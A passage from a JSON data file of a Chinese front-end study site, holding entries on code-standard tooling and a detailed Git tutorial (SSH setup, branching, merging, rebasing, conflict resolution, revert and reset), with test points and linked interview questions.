统一编辑器配置\n\n[EditorConfig](https://link.juejin.cn?target=https%3A%2F%2Feditorconfig.org%2F \"https://editorconfig.org/\")是一个跨编辑器/IDE 的编辑器配置工具。与 linter 和 formatter 不同，它的作用对象不是代码，而是去约束编辑器的配置，比如缩进风格是 tab 还是空格，缩进多少个字符。同时也说明，它是作用于文件级别的，对代码语法是无感的，对所有文件都生效。\n\n许多编辑器都支持 EditorConfig，有的可能需要安装插件，不需要项目安装什么依赖包，只需要在根目录下创建一个 `.editorconfig` 文件。\n\nEditorConfig 适用于团队成员中使用不同编辑器的场景。当所有编辑器都使用项目根目录下的 `.editorconfig` 文件作为配置时，能一定程度上保持代码文件的统一性。\n\n## 6. 总结\n\n前端工程化的常见代码规范工具有：\n\n* ESLint: 一个用于 JavaScript、JSX 等语言的可配置的代码检查工具。\n* Stylelint: 一个 CSS/Less/Sass 等样式代码的 linter。\n* Prettier: 支持多种语言的代码格式化工具。\n* Husky: 一个流行的用于配置 git hooks 的工具。\n* lint-staged: 对提交到暂存区的文件进行检查的工具。\n* EditorConfig: 统一不同编辑器配置的工具。\n* commitlint: 检查提交消息是否符合规范。\n* branch-name-lint: 检查代码分支是否符合规范。\n\n在使用中，要善于利用编辑器、git hooks、CI 工具来自动化执行代码检查和格式化。\n\n最后，谨记，工具虽好，但**不要一把梭**，需要根据团队情况和项目情况选择必要的几个即可。实践中，ESLint + Prettier + Husky + lint-staged 是大部分人的选择。如果过分使用，会引入一些不必要的工作内容和理解成本。",
    "testPoint": "1. 规则：ESLint + Prettier + stylelint 统一语法、格式、样式。  \n2. 提交：husky + lint-staged 在 commit 前自动跑检查；Commitizen 生成统一 message。  \n3. 分支：Git Flow / GitHub Flow；强制 PR + Code Review + CI 通过才能合并。  \n4. 文档：JSDoc / TypeDoc + README + CHANGELOG（changesets 自动生成）。  \n5. 持续：CI 中跑 lint/test/build，失败即阻断合并；定期 depfu/renovate 自动升级依赖。",
    "exerciseKeyList": "[\"3e97e4b8-dda4-4e5b-8fd9-136fe1e95eb4\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T02:38:03.000Z",
    "updateAt": "2025-10-23T08:26:52.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "3e97e4b8-dda4-4e5b-8fd9-136fe1e95eb4",
        "title": "如何在前端团队快速落地代码规范",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T09:21:42.000Z"
      }
    ]
  },
  "264": {
    "id": 264,
    "tagId": 28,
    "title": "版本控制",
    "explanation": "# 什么是版本控制\n\n版本控制是一种系统性的方法，用于管理和跟踪软件开发项目中的代码、文件和资源。它的核心目标是在不同时间点的开发中保持代码的一致性、可追溯性和可维护性。\n\n![image-20230911231417992.png](https://static.ecool.fun//article/539bd898-1d78-411e-abc8-c822d1a351ad.)\n\n# 为什么要做版本控制\n\n这个问题可以从定义中的关键词可以看出端倪：不同时间点下的代码一致性、可追溯性、可维护性。这里额外补充一点：当今的互联网开发早已步入敏捷迭代，各种动态化方案层出不穷都有着顺应时代潮流的意思，因此软件开发一定会越来越多地涉及到团队开发，团队之间的协作也一定需要这样一个机制去保障稳定性。\n\n## 代码一致性\n\n版本控制系统允许开发人员有效地管理和组织项目中的代码。它跟踪每个文件的历史记录，记录了每个版本的变更，包括谁做了什么修改、何时以及为什么。\n\n## 可追溯性\n\n版本控制系统允许为重要的里程碑或发布创建标签（`tag`），以便轻松识别和回滚到特定版本。\n\n并且当某个版本的代码出现问题，版本控制系统允许开发人员轻松地回滚到之前的稳定版本，并在不破坏其余代码的情况下进行修复。\n\n## 可维护性\n\n开发人员可以创建分支（`branch`），这是一个独立的代码副本，用于开发新功能、修复错误或进行实验性工作。然后，这些分支可以与主代码库合并，以实现功能集成。\n\n## 团队协作\n\n在多人协作的环境中，不同开发者可能同时修改代码。版本控制系统确保不同的修改不会互相冲突，以及如何解决冲突。\n\n版本控制系统促进了团队之间的协作，可以通过代码审查工具进行代码审查，以确保代码质量和一致性。\n\n# 版本控制工具`Git`\n\n## `Git`的安装\n\n### `WIndows`\n\n访问 [Git官网](https://link.juejin.cn?target=https%3A%2F%2Fgit-scm.com%2Fdownload%2F \"https://link.juejin.cn?target=https%3A%2F%2Fgit-scm.com%2Fdownload%2F\")，选择对应的操作系统下载即可。\n\n![image-20230912232951731.png](https://static.ecool.fun//article/15f58294-54ed-4a6e-8198-badc726991e5.)\n\n这里下载独立安装包即可\n\n![image-20230913224004260.png](https://static.ecool.fun//article/8db5460c-f601-4901-8527-5fa6e0c60968.)\n\n点`install`就行，会自动安装一个`git GUI`工具，但通常不会直接用它\n\n![image-20230915214225751.png](https://static.ecool.fun//article/e123c85a-adf8-4941-ac2c-2d2f2f74738c.)\n\n下载完成安装即可，输入以下命令验证安装是否成功\n\n```\ngit version\n\n```\n\n![image-20230915213639785.png](https://static.ecool.fun//article/fb51c156-314e-4992-bc91-4f1ffaf2cab2.)\n\n### 图形化工具\n\n#### 安装\n\n这里推荐[TortoiseGit](https://link.juejin.cn?target=https%3A%2F%2Ftortoisegit.org%2F \"https://link.juejin.cn?target=https%3A%2F%2Ftortoisegit.org%2F\")这个工具，非常方便。但我觉得Git本身学习成本并不高，`GUI`工具更多是为了提升效率，基本的`Git`知识点还是需要掌握的。\n\n![image-20230915215002286.png](https://static.ecool.fun//article/114d345f-b91f-42da-bc42-e37ad3e5d5b2.)\n\n下载本体\n\n![image-20230915220036200.png](https://static.ecool.fun//article/a0145fc5-6dae-4486-9fc2-9e8bff1a560a.)\n\n然后是语言包\n\n![image-20230915220110267.png](https://static.ecool.fun//article/0b497613-5ba2-45aa-b0cd-47ab7a0240ae.)\n\n安装时一路`next`即可，安装完本体后再安装语言包。\n\n![image-20230915221756497.png](https://static.ecool.fun//article/fafbbae8-9c97-4fdd-a9aa-dbb8efc03032.)\n\n配置好`Github`的账户、邮箱、秘钥等，注意配置好了密钥也不会在下述部分显示，可以打开编辑全局进行查看\n\n![image-20230915234541376.png](https://static.ecool.fun//article/48f8e8e6-8d43-49aa-a22b-7c35220543b4.)\n\n![image-20230915234908806.png](https://static.ecool.fun//article/1b37cafe-d083-44ee-a70f-0496dbb8ecc8.)\n\n#### 使用\n\n在使用之前先提前补充一个点（后续会详细介绍），`Git`有本地仓库和远端仓库的概念，通常支持`HTTPS`和`SSH`两种协议进行关联，两种方式优缺点也十分明显：\n\n* `HTTPS`：无需额外配置，但是在每次连接远端仓库时需要输入账号密码进行校验。\n* `SSH`：生成一组密钥对，需要本地进行配置，好处是配置好后每次连接远端仓库时会自动比较密钥对，无需额外校验。关于`SSH`详细可以参考这篇文章[ssh-远程登录协议](https://juejin.cn/post/7111881008630202398 \"https://juejin.cn/post/7111881008630202398\")\n\n为了一劳永逸，我们这里配置下`SSH`，首先打开`Git bash` ![image-20230915222652458.png](https://static.ecool.fun//article/4f34d6c4-bb36-44ba-a95a-310b826faa1c.)\n\n```\n# 输入下列命令，最后一个参数是您的邮箱\n$ ssh-keygen -t rsa -C yourEmail.com\n\n```\n\n可以看到密钥对已经生成了\n\n![image-20230916000616198.png](https://static.ecool.fun//article/72930496-ef24-4e0f-8e10-85abaaba79ac.)\n\n进入上述目录，注意`.ssh`文件夹默认是隐藏的，直接访问路径就行\n\n![image-20230916000945395.png](https://static.ecool.fun//article/0b49c41d-919b-40e2-9c01-2ff26be23f08.)\n\n![image-20230916001328118.png](https://static.ecool.fun//article/35bb28d1-8142-41b1-ae74-47dda4a76509.)\n\n以`Github`为例，配置公钥\n\n![image-20230916001225695.png](https://static.ecool.fun//article/9ab11682-8d04-420f-9848-2a4e58ae3c80.)\n\n![image-20230916001433366.png](https://static.ecool.fun//article/82fd888b-1a45-4f7c-a81f-74af186f70db.)\n\n创建一个`Demo`项目，平时学习的话就创建公有项目就行\n\n![image-20230916140231789.png](https://static.ecool.fun//article/3951f058-676a-45c7-bc40-a4585e7a166d.)\n\n![image-20230916140427591.png](https://static.ecool.fun//article/1d26b338-6f0b-49a5-8832-bfbc5ee5affd.)\n\n复制一下我们的项目链接\n\n![image-20230916140701062.png](https://static.ecool.fun//article/e145d83a-732d-43db-9982-6e7a1e756605.)\n\n选取一个你喜欢的目录作为本地工作区，然后按鼠标右键\n\n![image-20230916140808118.png](https://static.ecool.fun//article/a1b2adbe-15a3-4a8b-93ae-190129266b66.)\n\n![image-20230916141034111.png](https://static.ecool.fun//article/e90e617b-e98b-4974-b4b7-93c02d652b7a.)\n\n![image-20230916141147366.png](https://static.ecool.fun//article/436e2887-e689-44ff-8916-37c6882608ea.)\n\n然后喜提报错，但没事是因为我们缺失一个配置，导致`TortoiseGit`和`Git`冲突了\n\n![image-20230916141853591.png](https://static.ecool.fun//article/cced8401-8fbf-445a-84f7-c761ea759192.)\n\n首先我们找到安装Git的目录，拷贝一下`ssh.exe`的路径，比如`D:\\software\\Git\\usr\\bin\\ssh.exe`\n\n![image-20230916142235824.png](https://static.ecool.fun//article/ab269f3b-849d-43b9-a630-4159b802383c.)\n\n![image-20230916142345782.png](https://static.ecool.fun//article/d46e9ffb-059a-40ab-b3fb-a5d67c443612.)\n\n`Here We Go`\n\n![image-20230916142550563.png](https://static.ecool.fun//article/96f1a134-b577-4d1f-98b7-9aded0bbc07c.)\n\n![image-20230916142614326.png](https://static.ecool.fun//article/b63b4cf1-8138-43e1-bd1b-6e6822705a79.)\n\n我们进到这个目录，创建一个`README.md`,随便写点什么保存\n\n![image-20230916142614326.png](https://static.ecool.fun//article/17b7f542-3622-4061-bef4-690345dc73f6.)\n\n![image-20230916142710007.png](https://static.ecool.fun//article/c436ab8e-4487-4d4c-83a9-7a5a8b0c5392.)\n\n将代码提交到本地暂存区\n\n![image-20230916143036207.png](https://static.ecool.fun//article/50b84c31-bc62-4cc9-a73f-46f593ebd4a6.)\n\n![image-20230916143147847.png](https://static.ecool.fun//article/f44b1578-7ce0-4d74-8de7-261c063a79b6.)\n\n提交完成后会有一个推送按钮，作用是将暂存区里的代码推送到远端\n\n![image-20230916143323072.png](https://static.ecool.fun//article/e46e19aa-887b-443f-b560-797a5b354215.)\n\n当然又可以鼠标右键，进行推送\n\n![image-20230916143446471.png](https://static.ecool.fun//article/92227748-92cd-4017-9691-322136ca4329.)\n\n![image-20230916143547159.png](https://static.ecool.fun//article/f1ccad15-52ac-439c-a4ae-4a558a6edc84.)\n\n然后我们重新起一个目录验证一下，代码是否被推送到了远端，和前面一样手动`Clone`一下\n\n![image-20230916143808561.png](https://static.ecool.fun//article/a9a55174-7e31-4292-af13-e8b3d7615f72.)\n\n![image-20230916143848311.png](https://static.ecool.fun//article/242a8977-1054-462d-893c-4de55dd0fee2.)\n\n到此为止，`GUI`工具就先简易把玩到这里，你可能会疑惑拉取、同步按钮这些不是还没讲吗？别着急，我们先从`Git`的机制入手，看看`GUI`工具背后都做了哪些工作，到时候不用我说你也会细细把玩了~\n\n### VS Code插件推荐\n\n这里主要推荐官方自带的`Git`工具和两个补充插件\n\n### 官方自带+`Gitlen`\n\n`Gitlen`是非常全面的`git`插件，这里就结合官方自带能力演示一下常规用到的一些功能点。\n\n查看某行代码的提交信息\n\n![image-20230916150409688.png](https://static.ecool.fun//article/8296e82f-b584-4812-a24f-7703d58ad3d1.)\n\n可以很直观地看到本地和远端代码的版本差异\n\n![image-20230916144800928.png](https://static.ecool.fun//article/3e3b708e-b2ca-4d5c-83f8-49ec4b51de9a.)\n\n将代码添加到缓存中\n\n![image-20230916144953640.png](https://static.ecool.fun//article/f79025d0-98b2-4009-89b5-b494e8dc1c9a.)\n\n将代码提交到本地暂存区\n\n![image-20230916145514767.png](https://static.ecool.fun//article/04f304b9-cdde-4f40-a655-27414b67b26c.)\n\n将代码推送到远端\n\n![image-20230916145657639.png](https://static.ecool.fun//article/d2dcb974-9828-464d-97f8-3f8816dbec58.)\n\n查看刚刚提交的信息\n\n![image-20230916145749825.png](https://static.ecool.fun//article/cd173370-c3aa-45b6-8a7c-f43561aea2f5.)\n\n### `Git Graph`\n\n一个优美的`Git`提交可视化插件，在团队开发时可以很直观地看出各版本之前的差异。\n\n![image-20230916150209278.png](https://static.ecool.fun//article/6b370f8a-cc1d-4858-9600-526bd4016cf8.)\n\n## 本地仓库、暂存区、远端仓库\n\n相信通过前面的实操你已经对这三个概念有了基本的认识，接下来我们详细了解一下他们之前的区别把。\n\n### 本地仓库\n\n* 本地仓库是物理存储在您电脑上的`Git`仓库副本\n* 它包含了完整的项目记录和文件版本信息\n* 您可以在本地仓库中进行增删改查等所有你想对代码干的事儿\n\n### 暂存区\n\n* 暂存区是本地仓库的一部分，可以理解为本地仓库变更的一个快照，用于准备要提交的更改\n* 当你完成文件粒度的代码变更后，需要将这些文件提交到暂存区，以便一次性提交一个或多个更改。这使得你可以有选择地进行提交更改，而不是一次性提交所有更改\n* 暂存区和当前正在开发的本地仓库是一一对应的，也就是说当代码已经保存到暂存区后，不能再进行诸如分支切换等变更本地仓库文件版本的操作\n\n### 远程仓库\n\n* 远程仓库是位于网络上的`Git`仓库副本，通常托管在代码托管服务上。（如`GitHub、Gitlab`等）\n* 它允许多个开发者协同工作，共享项目代码。\n* 具备私有和公有属性，由开发者决定是否将项目开源\n* 具备特定分支保护性，通常将`master`（主干）分支作为受保护的分支，不允许开发者在主干分支上进行开发，亦不允许开发者将本地分支代码直接推送到主干。那么怎么把分支同步到主干呢？一般托管平台会提供一个`PR`(`pull request`)能力，即一种向其他分支提交合并代码请求的能力。开发者创建`PR`，由项目的主要负责人和团队中的成员进行代码的审核后，合并到`master`分支\n* 当然你可以从远程仓库拉取最新代码以及将本地更改推送远端，并解决版本不一致带来的冲突\n\n## 分支、提交、标签\n\n这三个概念都是用作`Git`的版本控制的，可以细分出下面这些差异。\n\n### 分支（`branch`）\n\n* 分支是`Git`中用于并行开发和代码管理的核心机制，它允许你创建一个独立的开发线而不影响主线代码。（可以类比与世界线进行理解）\n* 每个分支都有自己的代码历史，你可以在分支上就行修改、提交和合并操作。\n* 常见的用途包含新增特性（`feature`分支）、修复代码（`bugfix`分支）、发布功能（`release`分支）、热修复（`hotfix`分支，一般用在`native`代码中）。这些分支命名是一种约定俗成的规范，我们在开发过程中也请尽量遵循这样的规范以减少沟通理解带来的`gap`\n\n```\n# 常用的分支命令，多的不用记，用到了再查就行\n​\n# 创建一个本地分支\ngit checkout -b branchName\n​\n# 拉取远端分支信息\ngit fetch\n​\n# 切换分支\ngit checkout newBranch\n​\n# 查看所有本地分支\ngit branch\n​\n# 查看远端所有分支,这里的-r指的是origin，也就是远端\ngit branch -r\n\n```\n\n### 提交（`commit`）\n\n前文在实践过程中已经提到过部分`commit`的知识点了，我们再来温习一下。\n\n* 提交操作相当于是一个快照，将本次更改的文件和提交信息存储到了暂存区。\n* 提交是代码历史的基本单位，可以有效地追踪和回溯项目的演变。\n* 提交时需要附带一条有意义的提交信息，以便更好理解每次更改的目的。\n\n```\n# 常用命令\n​\n# 提交代码到暂存区\ngit commit -m \"本次提交干了啥\"\n​\n# 提交代码到暂存区并跳过检查（不是很推荐跳过git hook的检查，但我就喜欢这样干，最后再统一修正）\ngit commit -m '本次干了啥' --no-verify\n\n```\n\n### 标签\n\n* 标签是`Git`中用于标记特定提交的方式，通常用于标记项目的重要里程碑。注意：在我们使用一些热门库时经常会看见诸如`@latest、@release、@beta-0.1`这样紧跟在`npm`包后面的小东西，这也就是标签，但不是`git`的标签而是`npm`包的标签，我们会在后续包管理的文章里再提到这一点。\n* 不同于分支。标签是静态的，不会随着新的提交而发生移动，除非你手动再次进行标记。\n* 标签所带来的语义能够让你很方便地找到和回滚到特定版本。\n\n```\n# 常用命令\n​\n# 创建标签\ngit tag 'release'\n​\n# 查看所有便签\ngit tag\n​\n# 查看特定标签的提交信息\ngit show tagName\n\n```\n\n## 如何运用`Git`创建一个工作区\n\n这个小节其实已经在`GUI`工具哪里浅浅地操作了一遍了，我们再复习一下~\n\n### 克隆代码，将代码从远端拉到本地\n\n```\n# 参数是仓库的ssh或https链接\ngit clone git@xxxxx\n​\n# clone后会自动关联远端，当然也可以通过下面命令进行关联\ngit remote add origin git@xxxxx\n\n```\n\n### 创建分支\n\n```\n# 创建分支\ngit checkout -b feature/git-demo\n\n```\n\n### 拉取代码\n\n这一步通常会有`git fetch`和`git pull`两种方式，几乎所有的教程都会告诉你`git pull`是`git fetch + git merge`的命令语法糖，但并不会告诉你怎么用`git fetch`，因为我们在`git fetch`后无论是`ide`还是命令窗口都不会像`git pull`把`diff`的有效信息展示到我们眼前，所以接下来我们来仔细讲讲这个问题吧！\n\n#### `git fetch`\n\n执行`git fetch`不止会把远端代码变更拉取下来，还能将分支等信息也一并拉取下来，我们可以用前面的命令来进行检索`git brach -a`\n\n![image-20230916170328663.png](https://static.ecool.fun//article/0bb62bc1-7742-4712-947c-5a69e0f8fb2d.)\n\n那么我们怎么看，拉取的远端代码有哪些变更呢？结合我们之前安装的`Vs code`插件可以进行预览（二选一即可）\n\n![image-20230916170745241.png](https://static.ecool.fun//article/09baf110-4c6a-4303-8020-d926d9de6986.)\n\n![image-20230916170807322.png](https://static.ecool.fun//article/8ff86e09-2fad-43fd-a2c2-114dcb588a36.)\n\n### 合并代码\n\n检索完代码变更后我们如何合并呢？这里有`git merge`和`git rebase`两种方式，并且均会在有冲突时被打断，因此不用担心将代码冲突也一并合并了\n\n#### `merge VS rebase`\n\n一图胜千言，这是`merge`合并后的`git graph`\n\n![image-20230916171813643.png](https://static.ecool.fun//article/7bb74a11-c84a-4231-9e3e-5ca93d418d74.)\n\n这是`rebase`后的`git graph`\n\n![image-20230916171901583.png](https://static.ecool.fun//article/857b8639-99a8-4601-bc86-3f86b023f63c.)\n\n区别在于`git merge`后形成了一条`commit`，合并`HEAD`指针指向了新的提交，并且仍然存在两条时间线。而`git rebase`会在提交后销毁自身的世界线，融入主干的世界线，并且不会引起`HEAD`指针的变化。实际使用合理使用`git rebase`能有效减少世界线的条数，降低合并的复杂度。更多详情我推荐这篇文章[面试官：说说你对Git Rebase 和 Git Merge的理解？区别？](https://link.juejin.cn?target=https%3A%2F%2Fwww.51cto.com%2Farticle%2F678181.html \"https://link.juejin.cn?target=https%3A%2F%2Fwww.51cto.com%2Farticle%2F678181.html\")\n\n解决冲突属于一个重要的部分，我们在后面一个场景小节单独说下。\n\n### 提交代码\n\n```\n# 创建分支后首次提交，需要关联下远端\ngit push --set-upstream origin feature/git-demo\n​\n# 后续提交无需再关联\ngit push\n\n```\n\n### 提PR\n\n![image-20230916173330209.png](https://static.ecool.fun//article/03427c5f-194e-4329-b461-179da3e36d19.)\n\n![image-20230916173449076.png](https://static.ecool.fun//article/7851953c-f04a-4bf3-bd42-0b3bde142197.)\n\n![image-20230916173538435.png](https://static.ecool.fun//article/5cc148e4-ef26-4315-aa26-8606be8c2874.)\n\n在别人审核通过后，`merge`按钮会变绿，我们就可以合并到主干啦\n\n![image-20230916173638246.png](https://static.ecool.fun//article/c8755ebb-e533-4058-bc2e-baf921a8dd8f.)\n\n![image-20230916173701152.png](https://static.ecool.fun//article/9fd1dca9-f012-4a69-8512-a1b9d76d1cfb.)\n\n## 特殊场景处理\n\n### 合并冲突\n\n接着上面的例子，我们创建了一个新的分支并修改了同一个文件，然后推送到远端\n\n![image-20230916174153782.png](https://static.ecool.fun//article/6ecffc57-64ca-4ac7-84e5-b0964159eef6.)\n\n这时我们直接提`PR`会直接被打回，提示我们需要在合并前解决冲突。\n\n![image-20230916174400793.png](https://static.ecool.fun//article/e72e519c-2b7f-4459-a58c-315657fbd2da.)\n\nok接下来，我们来解决冲突。\n\n首先是拉取并合并主干代码，这时我们发现会有传入更改和当前更改两段代码。\n\n![image-20230916174522774.png](https://static.ecool.fun//article/d0414f6c-f2c1-4026-84cd-d463b5731190.)\n\n这里我提供一个个人解决冲突常用的思路：优先接收传入的变更，因为我对于自己的变更更熟悉，所以我通常会先备份自己的代码变更，然后接受传入的变更，最后再融入个人的代码变更，这对于我来说是一个高效的解决思路，但仍有一些细节需要处理。涉及到`package.json、yarn.lcok`等变更时，在解决冲突记得重新`yarn`一下，防止`npm`包的冲突；涉及到核心业务逻辑和细粒度很高的地方（比如修改了同一个函数并且是不兼容变更）时需要和同事一起确认正确的逻辑后再进行冲突合并，否则很容易因解决冲突而发生代码丢失的情况。当然这种冲突本身是应该尽量避免的，避免两个甚至多个同学对同一个模块进行并行开发。\n\n回到案例中，这两个冲突属于兼容性冲突，我们按上面的策略先拷贝我的变更，再接受传入的变更，最后将拷贝的变更合入，（PS：我当然知道可以直接点保留双方更改，但我不推荐这样做，这个操作往往会带来一些麻烦）最后我们提交一条新的`commit`用于解决冲突。\n\n![image-20230916175723056.png](https://static.ecool.fun//article/a5d83c72-b524-4b49-b652-3d825b340566.)\n\n然后我们刷新`PR`页面会发现此时已经可以合并到主干了\n\n![image-20230916175836932.png](https://static.ecool.fun//article/96e911cb-d53b-4bd6-9a0d-0c8df2d9bc1b.)\n\n### 回撤代码\n\n当我们一步小心错误地合并代码了或者想要回退一些变更时，通常有两个做法，分别是`revert`和`reset`，下面是他们的一些特征对比：\n\n#### `revert`\n\n用于撤销一个或多个提交，并用一个新的提交来反转这些更改。这意味着原有的提交仍然存在，只是添加了一个新的提交来撤销之前的更改。在能用`revert`解决的情况下，我不建议使用`reset`，但`revert`无法回撤`merge`时形成的`commit`，此时就需要借助`reset`了。\n\n```\n# 查看 commit 信息\ngit log\n​\n# 回撤对应的commit\ngit revert commitId\n\n```\n\n![image-20230916182934388.png](https://static.ecool.fun//article/f5b1d736-67a9-483b-bc18-c0dad0a142f2.)\n\n#### `reset`\n\n用于移动分支的指针，以便于指向不同的提交，模式上包含软重置和硬重置。在回撤操作时通常使用硬重置，特别需要注意的是硬重置是强制将分支指针移动到特定`commit`，会丢失部分历史记录，使用时需要特别小心。\n\n```\n# 查看 commit 信息\ngit log\n​\n# 回撤对应的commit\ngit reset --hard commitId\n\n```\n\n### 使用旧功能进行新功能开发，如何将这些变更迁移到新分支\n\n分三步走:\n\n* 将旧分支的`commit`记录提交到远端，使用`git log`查看`commitId`并手动记录下来\n* 切换新分支\n* 执行`git cherry-pick commitId`\n\n更多`cherry-pick`相关知识，参考[git cherry-pick 教程](https://link.juejin.cn?target=https%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2020%2F04%2Fgit-cherry-pick.html \"https://link.juejin.cn?target=https%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2020%2F04%2Fgit-cherry-pick.html\")\n\n## 你可能并不需要这些命令\n\n看到不少博主都推荐使用`git stash`来处理并发更改的问题，我个人使用下来并不是很推荐这样做，原因很简单，经常会忘记，忘记保存过，忘记该恢复到哪个版本，恢复时误操作把代码给删了...\n\n简单介绍一下`git stash`\n\n```\n# 临时存储\ngit stash\n​\n# 查看存储记录\ngit stash list\n​\n# 恢复并且不删除stash内容\ngit stash apply\n​\n# 恢复并且删除stash内容\ngit stash pop\n\n```\n\n那么有没有什么办法规避呢，很简单嘛，把当前代码先提交一下；或者重新创建一个工作区拉取代码都能解决。并且想要某个文件在某一时段的变化，直接用`VS code`的时间轴功能不香吗？\n\n![image-20230916185824914.png](https://static.ecool.fun//article/441d534c-a659-405c-bd34-222f44f8684e.)",
    "testPoint": "1. 分支模型：Git Flow（主/开发/功能/补丁）或 Trunk-Based（主干+短分支）。  \n2. 提交规范：约定式 Commit (`feat/fix/docs...`) + Commitizen + husky 校验。  \n3. 版本号：语义化版本 SemVer（MAJOR.MINOR.PATCH），changesets/standard-version 自动生成 tag 与 CHANGELOG。  \n4. 合并门禁：Pull Request + Code Review + CI 通过 + 至少 1 人 approve。  \n5. 发布流程：CI 打 tag → 自动构建产物 → 上传到 NPM/OSS/CDN → 钉钉/飞书通知。",
    "exerciseKeyList": "[\"4dd061f1-8090-43fa-bd6c-48118828e070\",\"19026a8a-125c-4777-b2ab-19867362d590\",\"37ec6705-eb04-44c9-99eb-4ffda663c7f7\",\"e3f8c4ad-de53-4f97-9ec1-54b65c787569\",\"24674728-b580-4985-8fb0-e7c304f5e406\",\"cfe8f03e-1a05-4c00-baa7-04ae08c8765c\",\"7aa8fdff-3c1c-423c-8f2d-cd784dfcbac1\",\"16026c51-5821-4251-8d0c-374eac4dedf8\",\"51f3a49c-32aa-432a-bc14-eaba466d9d12\",\"7c614bf5-b7bf-424f-9e9e-539aafa5d273\",\"d462f484-bcf7-4109-a4c0-c77fb2ed74de\",\"791b77aa-0432-440b-bedb-506a4f8eac36\",\"6a7426e0-2423-42c7-aa9f-55a67290b8db\",\"02ba022f-9a63-4a9b-a668-1e2f01ab3493\",\"8ba67b8e-c23a-4919-b645-2757fc1e8be4\",\"bfa42e01-30b6-4c60-9f2b-81b7495aaebe\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2025-08-07T02:47:34.000Z",
    "updateAt": "2025-10-23T08:27:42.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "02ba022f-9a63-4a9b-a668-1e2f01ab3493",
        "title": "什么是 git stash？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:05:22.000Z",
        "updateAt": "2021-07-07T00:12:09.000Z"
      },
      {
        "exerciseKey": "16026c51-5821-4251-8d0c-374eac4dedf8",
        "title": "说说对git pull 和 git fetch 的理解？有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:39:27.000Z",
        "updateAt": "2024-01-25T19:22:21.000Z"
      },
      {
        "exerciseKey": "19026a8a-125c-4777-b2ab-19867362d590",
        "title": "如果有 git 仓库需要迁移，应该怎么操作？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-12-10T01:46:24.000Z"
      },
      {
        "exerciseKey": "24674728-b580-4985-8fb0-e7c304f5e406",
        "title": "说说 git 发生冲突的场景？如何解决？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:40:58.000Z",
        "updateAt": "2024-01-25T19:23:33.000Z"
      },
      {
        "exerciseKey": "37ec6705-eb04-44c9-99eb-4ffda663c7f7",
        "title": "git 中 rebase、reset、revert 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T09:59:24.000Z",
        "updateAt": "2024-08-10T17:07:31.000Z"
      },
      {
        "exerciseKey": "4dd061f1-8090-43fa-bd6c-48118828e070",
        "title": "git merge master 与 git merge origin master 有什么区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-10-18T09:00:13.000Z",
        "updateAt": "2024-10-18T09:00:18.000Z"
      },
      {
        "exerciseKey": "51f3a49c-32aa-432a-bc14-eaba466d9d12",
        "title": "说说Git 中 HEAD、工作树和索引之间的区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:39:06.000Z",
        "updateAt": "2024-01-25T19:22:01.000Z"
      },
      {
        "exerciseKey": "6a7426e0-2423-42c7-aa9f-55a67290b8db",
        "title": "怎么使用 git 将多次提交压缩成一次提交？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:10:02.000Z",
        "updateAt": "2021-07-07T00:12:12.000Z"
      },
      {
        "exerciseKey": "791b77aa-0432-440b-bedb-506a4f8eac36",
        "title": "说说你对Git的理解？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:37:30.000Z",
        "updateAt": "2024-01-25T19:20:20.000Z"
      },
      {
        "exerciseKey": "7aa8fdff-3c1c-423c-8f2d-cd784dfcbac1",
        "title": "说说你对git stash 的理解？应用场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:39:54.000Z",
        "updateAt": "2024-01-25T19:22:37.000Z"
      },
      {
        "exerciseKey": "7c614bf5-b7bf-424f-9e9e-539aafa5d273",
        "title": "说说Git常用的命令有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:38:29.000Z",
        "updateAt": "2024-01-25T19:21:38.000Z"
      },
      {
        "exerciseKey": "8ba67b8e-c23a-4919-b645-2757fc1e8be4",
        "title": "git pull 和 git fetch 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:04:46.000Z",
        "updateAt": "2021-07-07T00:12:07.000Z"
      },
      {
        "exerciseKey": "bfa42e01-30b6-4c60-9f2b-81b7495aaebe",
        "title": "Git，GitHub与GitLab分别是什么？有什么区别？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T12:56:28.000Z",
        "updateAt": "2021-07-07T00:12:04.000Z"
      },
      {
        "exerciseKey": "cfe8f03e-1a05-4c00-baa7-04ae08c8765c",
        "title": "说说你对git rebase 和 git merge的理解？以及它们的区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:40:23.000Z",
        "updateAt": "2024-01-25T19:23:01.000Z"
      },
      {
        "exerciseKey": "d462f484-bcf7-4109-a4c0-c77fb2ed74de",
        "title": "说说Git中 fork, clone,branch这三个概念，有什么区别?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:38:03.000Z",
        "updateAt": "2024-01-25T19:21:11.000Z"
      },
      {
        "exerciseKey": "e3f8c4ad-de53-4f97-9ec1-54b65c787569",
        "title": "说说你对git reset 和 git revert 的理解？区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T03:41:23.000Z",
        "updateAt": "2024-08-10T17:05:50.000Z"
      }
    ]
  },
  "265": {
    "id": 265,
    "tagId": 28,
    "title": "包管理",
